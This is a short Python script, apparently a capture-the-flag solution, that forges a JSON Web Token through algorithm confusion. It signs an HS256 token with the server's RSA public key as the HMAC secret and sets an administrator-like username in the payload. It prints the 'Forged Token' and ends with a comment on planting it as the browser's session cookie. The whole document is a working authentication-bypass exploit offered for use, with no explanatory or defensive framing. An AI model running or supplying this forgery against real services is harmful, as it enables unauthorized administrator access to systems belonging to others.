import base64
import hmac
import hashlib
import json

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

# Load public key (assumed leaked or publicly accessible)
with open("public.pem", "rb") as f:
    secret = f.read().strip()

# Craft header + payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "3y_adm!n!strat0r"}

# Encode them
header_b64 = b64url_encode(json.dumps(header).encode())
payload_b64 = b64url_encode(json.dumps(payload).encode())

# Sign using HMAC + public key as secret
message = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(secret, message, hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)

# Final token
token = f"{header_b64}.{payload_b64}.{signature_b64}"
print("Forged Token:\n", token)

# Use this in your browser:
# document.cookie = "session=<token>"
